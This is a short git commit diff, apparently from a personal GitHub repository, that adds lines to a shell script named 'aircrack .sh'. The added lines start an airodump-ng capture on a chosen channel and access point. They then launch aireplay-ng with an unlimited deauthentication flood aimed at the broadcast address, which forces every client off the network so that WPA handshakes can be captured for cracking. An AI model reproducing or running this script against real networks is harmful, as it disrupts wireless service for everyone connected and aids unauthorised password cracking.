5946f8375710caa8ad89ca63e974e76f022b3d78
haripatelll <34925349+haripatelll@users.noreply.github.com>
2019-08-15 23:55:35 -0400

    Update aircrack .sh

--- aircrack .sh
+++ aircrack .sh
@@ -12,3 +12,8 @@ read bid
 echo $bid
 echo Channel
 read chnl
+client=FF:FF:FF:FF:FF:FF
+airodump-ng --ig -w cap -c $chnl --bssid $bid $mon & sleep 6 &&
+xterm -hold -e "aireplay-ng --ig --deauth 0 -a $bid -c $client $mon"
+sleep 4
+clear
